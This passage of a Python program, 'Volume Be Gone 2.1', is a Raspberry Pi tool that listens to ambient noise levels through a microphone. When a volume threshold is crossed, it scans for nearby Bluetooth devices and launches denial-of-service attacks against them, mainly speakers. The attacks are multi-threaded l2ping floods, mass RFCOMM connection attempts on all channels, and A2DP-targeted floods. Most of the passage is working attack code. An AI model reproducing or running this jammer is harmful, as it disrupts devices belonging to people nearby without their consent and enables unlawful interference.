            print(f"[!] SDP: No se encontraron canales RFCOMM, usando rango completo")
            # Si no encontramos servicios, usar rango común
            rfcomm_channels = list(range(1, 31))

    except subprocess.TimeoutExpired:
        print(f"[!] SDP timeout para {device_addr}")
        rfcomm_channels = list(range(1, 31))
    except Exception as e:
        print(f"[!] Error en SDP enumeration: {e}")
        rfcomm_channels = list(range(1, 31))

    return rfcomm_channels

def start_hcidump_logging():
    """Inicia captura de tráfico Bluetooth con hcidump"""
    global hcidump_process, myPath, bt_interface

    try:
        dump_file = myPath + f"bt_capture_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.dump"
        print(f"[*] Iniciando captura hcidump: {dump_file}")

        hcidump_process = subprocess.Popen(
            ['hcidump', '-i', bt_interface, '-w', dump_file],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        writeLog(f"Captura hcidump iniciada: {dump_file}")
        print("[+] Captura de tráfico Bluetooth activa")
        return True

    except FileNotFoundError:
        print("[!] hcidump no encontrado, captura deshabilitada")
        return False
    except Exception as e:
        print(f"[!] Error iniciando hcidump: {e}")
        return False

def stop_hcidump_logging():
    """Detiene captura hcidump"""
    global hcidump_process

    if hcidump_process:
        try:
            hcidump_process.terminate()
            hcidump_process.wait(timeout=5)
            print("[*] Captura hcidump detenida")
        except:
            hcidump_process.kill()
        hcidump_process = None

def quick_scan_bluetooth():
    """Escaneo ultra-rápido (2 seg) para capturar dispositivos al encenderse - SIN FILTROS"""
    global bt_devices, bt_devices_cache, scanning, bt_interface

    if scanning:
        return bt_devices

    scanning = True

    try:
        # hcitool inq en modo rápido (2 segundos) - SIN resolver nombres
        inq_devices = scan_with_hcitool_inq(quick_mode=True)

        new_found = 0
        for addr, device in inq_devices.items():
            if addr not in bt_devices_cache:
                # GUARDAR TODOS LOS DISPOSITIVOS SIN FILTRAR
                # Los parlantes baratos NO reportan device class correctamente
                bt_devices_cache[addr] = device
                new_found += 1
                print(f"[+] QUICK: {addr} (class: {hex(device['class']) if device['class'] else 'N/A'})")

        if new_found > 0:
            bt_devices = list(bt_devices_cache.values())
            save_config()
            print(f"[*] Quick scan: +{new_found} nuevos, total={len(bt_devices_cache)}")

    except Exception as e:
        pass  # Silencioso en modo rápido

    scanning = False
    return bt_devices

def scan_bluetooth_devices():
    """Escanea dispositivos Bluetooth usando múltiples métodos - DUAL MODE (Classic + BLE) - SIN FILTROS"""
    global bt_devices, bt_devices_cache, scanning, bt_interface
    scanning = True

    print(f"[*] Escaneando dispositivos Bluetooth usando {bt_interface}...")
    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Dual: Classic + BLE")

    new_devices_found = 0

    try:
        # Hacer el adaptador BT descubrible
        os.system(f"hciconfig {bt_interface} piscan 2>/dev/null")

        # Escaneo más agresivo para adaptador externo
        if use_external_adapter and bt_interface == "hci1":
            os.system(f"hcitool -i {bt_interface} cmd 0x03 0x001A 0x00 0x10 0x00 0x10 2>/dev/null")

        # === MÉTODO 1: hcitool inq (Bluetooth Classic - más agresivo) ===
        print("[*] Método 1: hcitool inq (Classic)...")
        inq_devices = scan_with_hcitool_inq()

        for addr, device in inq_devices.items():
            if addr not in bt_devices_cache:
                # Intentar obtener nombre
                name = get_device_name(addr)
                device['name'] = name
                device['is_ble'] = False  # Marcar como Classic Bluetooth
                device['services'] = []

                # GUARDAR TODOS - SIN FILTRAR POR CLASS
                bt_devices_cache[addr] = device
                new_devices_found += 1
                print(f"[+] INQ: {addr} - {name or 'Sin nombre'} (class: {hex(device['class']) if device['class'] else 'N/A'})")

        # === MÉTODO 2: bluetooth.discover_devices (Classic estándar) ===
        print("[*] Método 2: Discovery estándar (Classic)...")
        try:
            device_id = 1 if bt_interface == "hci1" else 0
            nearby_devices = bluetooth.discover_devices(
                duration=8,
                lookup_names=True,
                flush_cache=True,
                lookup_class=True,
                device_id=device_id
            )

            for addr, name, device_class in nearby_devices:
                if addr not in bt_devices_cache:
                    # GUARDAR TODOS - SIN FILTRAR
                    bt_devices_cache[addr] = {
                        'addr': addr,
                        'name': name,
                        'class': device_class,
                        'is_ble': False,  # Marcar como Classic Bluetooth
                        'services': []
                    }
                    new_devices_found += 1
                    print(f"[+] Discovery: {addr} - {name}")
                elif name and not bt_devices_cache[addr].get('name'):
                    # Actualizar nombre si no lo teníamos
                    bt_devices_cache[addr]['name'] = name

        except Exception as e:
            print(f"[!] Error en discovery estándar: {e}")

        # === MÉTODO 3: BLE Scan (hcitool lescan) ===
        print("[*] Método 3: BLE Scan (lescan)...")
        scan_ble_devices()  # Esta función ya actualiza bt_devices_cache

        # Contar nuevos dispositivos BLE
        for addr, device in bt_devices_ble.items():
            if addr in bt_devices_cache and addr not in [d['addr'] for d in bt_devices]:
                new_devices_found += 1

        # Actualizar lista de dispositivos desde caché
        bt_devices = list(bt_devices_cache.values())

        # Guardar caché en config si hay nuevos dispositivos
        if new_devices_found > 0:
            save_config()

        print(f"[*] Nuevos dispositivos encontrados: {new_devices_found}")
        print(f"[*] Total dispositivos en caché: {len(bt_devices_cache)}")
        writeLog(f"Escaneo DUAL: +{new_devices_found} nuevos, total={len(bt_devices_cache)}")

    except Exception as e:
        print(f"[!] Error escaneando: {e}")
        writeLog(f"Error en escaneo BT: {str(e)}")

    scanning = False
    return bt_devices

def attack_l2ping_thread(device_addr, package_size, thread_id):
    """Thread individual para ataque L2CAP ping"""
    global bt_interface, monitoring
    try:
        # l2ping con flood mode (-f) y tamaño específico
        subprocess.run(
            ['l2ping', '-i', bt_interface, '-s', str(package_size), '-f', '-t', '0', device_addr],
            timeout=l2ping_timeout,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def attack_rfcomm_channel(device_addr, channel):
    """Ataca un canal RFCOMM específico con múltiples conexiones"""
    global bt_interface, rfcomm_connections_per_channel
    try:
        for i in range(rfcomm_connections_per_channel):
            subprocess.Popen(
                ['rfcomm', '-i', bt_interface, 'connect', device_addr, str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(0.02)  # 20ms entre conexiones
    except:
        pass

def attack_a2dp_avdtp(device_addr):
    """Ataque específico al perfil A2DP/AVDTP"""
    global bt_interface
    try:
        print(f"[*] Ataque A2DP/AVDTP a {device_addr}...")

        # Intentar establecer múltiples streams A2DP simultáneos
        # Esto satura el buffer de audio del parlante
        for i in range(10):
            # Usar rfcomm en canales típicos de A2DP (1, 3, 25)
            for channel in [1, 3, 25]:
                subprocess.Popen(
                    ['rfcomm', '-i', bt_interface, 'connect', device_addr, str(channel)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

            # Intentar conexiones L2CAP en PSM de A2DP (PSM 25 = AVDTP)
            # Nota: esto requiere herramientas más avanzadas, usamos l2ping como fallback
            subprocess.Popen(
                ['l2ping', '-i', bt_interface, '-s', '672', '-f', device_addr],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(0.1)

    except Exception as e:
        pass

def attack_device(device_addr, device_name):
    """Ataca un dispositivo con TODOS los métodos en PARALELO - Máxima agresividad"""
    global bt_interface, l2ping_threads_per_device, l2ping_package_sizes
    global rfcomm_max_channels, sdp_enumerate_before_attack
    global a2dp_stream_attacks

    print(f"[!] ATAQUE COMPLETO: {device_addr} ({device_name}) via {bt_interface}")
    writeLog(f"Ataque completo: {device_addr} - {device_name}")

    attack_thread_list = []

    try:
        # ===== 1. ENUMERACIÓN SDP (si está habilitada) =====
        rfcomm_channels = []
        if sdp_enumerate_before_attack:
            rfcomm_channels = enumerate_sdp_services(device_addr)
        else:
            rfcomm_channels = list(range(1, rfcomm_max_channels + 1))

        # ===== 2. ATAQUE L2CAP PING MASIVO (40 threads, múltiples tamaños) =====
        print(f"[*] Lanzando {l2ping_threads_per_device} threads de l2ping...")
        for i in range(l2ping_threads_per_device):
            # Rotar entre diferentes tamaños de paquete
            package_size = l2ping_package_sizes[i % len(l2ping_package_sizes)]
            thread = threading.Thread(
                target=attack_l2ping_thread,
                args=(device_addr, package_size, i),
                daemon=True
            )
            thread.start()
            attack_thread_list.append(thread)
            time.sleep(0.01)  # 10ms entre lanzamientos

        # ===== 3. ATAQUE RFCOMM MASIVO A TODOS LOS CANALES =====
        print(f"[*] Atacando {len(rfcomm_channels)} canales RFCOMM...")
        for channel in rfcomm_channels[:rfcomm_max_channels]:
            thread = threading.Thread(
                target=attack_rfcomm_channel,
                args=(device_addr, channel),
                daemon=True
            )
            thread.start()
            attack_thread_list.append(thread)
            time.sleep(0.01)

        # ===== 4. ATAQUE ESPECÍFICO A2DP/AVDTP =====
        if a2dp_stream_attacks:
            thread = threading.Thread(
                target=attack_a2dp_avdtp,
                args=(device_addr,),
                daemon=True
            )
            thread.start()
            attack_thread_list.append(thread)

        # ===== 5. BOMBARDEO CONTINUO L2CAP CON OS SYSTEM (adicional) =====
        # Lanzar procesos adicionales en background
        for i in range(10):
            try:
                os.system(f'l2ping -i {bt_interface} -s 600 -f {device_addr} &')
                os.system(f'l2ping -i {bt_interface} -s 1200 -f {device_addr} &')
            except:
                pass

        print(f"[+] Ataque activo con {len(attack_thread_list)} threads")

    except Exception as e:
        print(f"[!] Error en ataque: {e}")

def continuous_attack():
    """Ataque continuo a dispositivos FILTRADOS en PARALELO (máximo 5 simultáneos)"""
    global bt_devices, monitoring

    while monitoring:
        if bt_devices:
            # ===== APLICAR FILTRADO INTELIGENTE =====
            # Filtrar solo dispositivos de audio y limitar a max_simultaneous_attacks
            filtered_devices = filter_attack_targets(bt_devices)

            # Registrar información del filtrado
            log_device_filtering(bt_devices, filtered_devices)

            if not filtered_devices:
                # No hay dispositivos de audio para atacar
                print("[*] No se detectaron dispositivos de audio para atacar")
                writeLog("No se detectaron dispositivos de audio para atacar")
                time.sleep(5)
                continue

            # Atacar solo los dispositivos FILTRADOS en PARALELO
            attack_threads = []

            for device in filtered_devices:
                if not monitoring:
                    break

                print(f"[+] Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")
                writeLog(f"Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")

                # Lanzar thread de ataque para cada dispositivo filtrado
                thread = threading.Thread(
                    target=attack_device,
                    args=(device['addr'], device.get('name', 'Unknown')),
                    daemon=True
                )
                thread.start()
                attack_threads.append(thread)
                time.sleep(0.2)  # 200ms entre dispositivos (más tiempo para evitar saturación)

            # Esperar un poco antes de re-atacar (aumentado para evitar saturación)
            time.sleep(8)
        else:
            time.sleep(1)

def monitor_volume():
    """Monitorea el nivel de volumen continuamente"""
    global monitoring, bt_devices, config_mode

    # Variables para el cálculo de dB promedio
    db_history = []
    history_size = 10

    # Verificar que hay dispositivos de audio disponibles
    try:
        devices = sd.query_devices()
        input_device = sd.query_devices(kind='input')
        print(f"[*] Dispositivo de entrada detectado: {input_device['name']}")
    except Exception as e:
        print(f"[!] Error: No se detectó micrófono USB: {e}")
        updateScreen("ERROR", "Micrófono USB", "no detectado")
        return

    def audio_callback(indata, frames, time, status):
        if status and status != 'input overflow':
            print(f"[!] Audio callback status: {status}")
        if config_mode:
            return

        # Calcular nivel de dB
        db_level = calculate_db(indata.flatten())

        # Mantener historial para promedio
        if db_level > -np.inf:
            db_history.append(db_level)
            if len(db_history) > history_size:
                db_history.pop(0)

            # Calcular promedio
            avg_db = np.mean(db_history)

            # Solicitar actualización del display (asíncrono, no bloquea)
            request_display_update(avg_db)

            # Si supera el umbral, activar ataque
            if avg_db > threshold_db and not scanning:
                print(f"[!] Umbral superado: {avg_db:.1f} dB")
                writeLog(f"Umbral superado: {avg_db:.1f} dB")

                # Escanear si no hay dispositivos
                if not bt_devices:
                    scan_thread = threading.Thread(target=scan_bluetooth_devices)
                    scan_thread.start()

    # Iniciar stream de audio
    try:
        with sd.InputStream(callback=audio_callback,
                           channels=1,
                           samplerate=sample_rate,
                           blocksize=chunk_size):
            print("[*] Monitoreando nivel de audio...")
            writeLog(f"Iniciado monitoreo de volumen - Umbral: {threshold_db} dB")

            while monitoring:
                time.sleep(0.1)
    except Exception as e:
        print(f"[!] Error en stream de audio: {e}")
        writeLog(f"Error en audio stream: {str(e)}")

def signal_handler(sig, frame):
    """Maneja la interrupción del programa"""
    global monitoring, encoder_running
    print('\n[*] Interrumpido')
    writeLog("Interrumpido")
    monitoring = False
    encoder_running = False

    # Detener captura hcidump
    stop_hcidump_logging()

    # Detener todos los procesos de ataque
    os.system("pkill -f l2ping")
    os.system("pkill -f rfcomm")

    GPIO.cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    global monitoring, bt_devices, config_mode, threshold_db, bt_interface, encoder_running

    print("")
    print("Volume Be Gone 2.1 - Auto-Start Edition")
    print("Control de parlantes BT por nivel de volumen")
    print("Gira el encoder para ajustar, presiona OK para iniciar")
    print("")

    # Total de pasos de inicialización
    total_steps = 7
    current_step = 0

    # Paso 1: Inicializar pantalla
    current_step += 1
    show_boot_screen(current_step, total_steps, "Init Display...")
    print(f"[{current_step}/{total_steps}] Pantalla OLED inicializada")
    time.sleep(0.5)

    # Paso 2: Configurar GPIO/Encoder
    current_step += 1
    show_boot_screen(current_step, total_steps, "Setup GPIO...")
    print(f"[{current_step}/{total_steps}] Configurando encoder")
    setup_encoder()
    time.sleep(0.5)

    # Paso 3: Cargar configuración
    current_step += 1
    show_boot_screen(current_step, total_steps, "Load Config...")
    print(f"[{current_step}/{total_steps}] Cargando configuración")
    load_config()
    time.sleep(0.5)

    # Paso 4: Verificar Bluetooth
    current_step += 1
    show_boot_screen(current_step, total_steps, "Check Bluetooth...")
    print(f"[{current_step}/{total_steps}] Verificando adaptadores Bluetooth")
    if not check_bluetooth_adapters():
        print("[!] Error: No se detectaron adaptadores Bluetooth")
        show_status_screen("ERROR", "No Bluetooth", "error")
        time.sleep(5)
        return
    time.sleep(0.5)

    # Paso 5: Verificar Micrófono
    current_step += 1
    show_boot_screen(current_step, total_steps, "Check Mic...")
    print(f"[{current_step}/{total_steps}] Verificando micrófono USB")
    try:
        devices = sd.query_devices()
        input_device = sd.query_devices(kind='input')
        print(f"[*] Dispositivo de entrada: {input_device['name']}")
    except Exception as e:
        print(f"[!] Error: No se detectó micrófono USB: {e}")
        show_status_screen("ERROR", "No Microfono", "error")
        time.sleep(5)
        return
    time.sleep(0.5)

    # Paso 6: Cargar recursos
    current_step += 1
    show_boot_screen(current_step, total_steps, "Load Resources...")
    print(f"[{current_step}/{total_steps}] Cargando recursos")
    logo_path = myPath + 'images/logo.png'
    time.sleep(0.3)

    # Paso 7: Sistema listo
    current_step += 1
    show_boot_screen(current_step, total_steps, "System Ready!")
    print(f"[{current_step}/{total_steps}] Sistema listo")
    time.sleep(1)

    writeLog(f"Iniciado - Volume Be Gone 2.1 - Adaptador: {bt_interface}")

    # Mostrar logo si existe
    try:
        if os.path.exists(logo_path):
            image = Image.open(logo_path).convert('1')
            disp.display(image)
            time.sleep(1.5)
        else:
            print(f"[*] Logo no encontrado, omitiendo...")
    except Exception as e:
        print(f"[!] Error cargando logo: {e}")
    
    # Modo configuración
    update_config_screen()
    print(f"[*] Modo configuración - Umbral actual: {threshold_db} dB")
    print(f"[*] Usando adaptador: {bt_interface} ({'Externo Clase 1' if bt_interface == 'hci1' else 'Interno'})")
    print("[*] Gira para ajustar, presiona para continuar")
    
    # Esperar configuración
    while config_mode:
        time.sleep(0.1)
    
    print(f"[*] Iniciando sistema con umbral: {threshold_db} dB")
    writeLog(f"Sistema activado - Umbral: {threshold_db} dB - Adaptador: {bt_interface}")
    
    # Iniciar captura hcidump (logging de tráfico Bluetooth)
    print("[*] Iniciando captura de tráfico Bluetooth...")
    start_hcidump_logging()
    time.sleep(0.5)

    # Escaneo inicial DUAL (Classic + BLE)
    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Dual: Classic + BLE")
    bt_devices = scan_bluetooth_devices()

    if bt_devices:
        updateScreen(f"Encontrados:", f"{len(bt_devices)} dispositivos", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
    else:
        updateScreen("Sin dispositivos", "Monitoreando...", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")

    time.sleep(2)

    # Iniciar monitoreo
    monitoring = True

    # Thread para ataque continuo (PARALELO)
    attack_thread = threading.Thread(target=continuous_attack, daemon=True)
    attack_thread.start()

    # Thread para actualización asíncrona del display (evita bloquear audio)
    disp_thread = threading.Thread(target=display_update_thread, daemon=True)
    disp_thread.start()

    # Thread para re-escaneo rápido Bluetooth Classic (2 seg)
    def periodic_quick_scan():
        while monitoring:
            time.sleep(2)
            if monitoring and not scanning and not config_mode:
                quick_scan_bluetooth()

    scan_thread = threading.Thread(target=periodic_quick_scan, daemon=True)
    scan_thread.start()

    # Thread para escaneo BLE continuo (5 seg)
    def periodic_ble_scan():
        while monitoring:
            time.sleep(5)
            if monitoring and not ble_scanning and not config_mode:
                scan_ble_devices()

    ble_thread = threading.Thread(target=periodic_ble_scan, daemon=True)
    ble_thread.start()
    
    # Monitorear volumen
    try:
        monitor_volume()
    except Exception as e:
        print(f"[!] Error: {e}")
        writeLog(f"Error en monitoreo: {str(e)}")
    finally:
        monitoring = False
        encoder_running = False

        # Detener captura hcidump
        stop_hcidump_logging()

        # Detener todos los procesos de ataque
        os.system("pkill -f l2ping")
        os.system("pkill -f rfcomm")

        GPIO.cleanup()

if __name__ == '__main__':
    main()
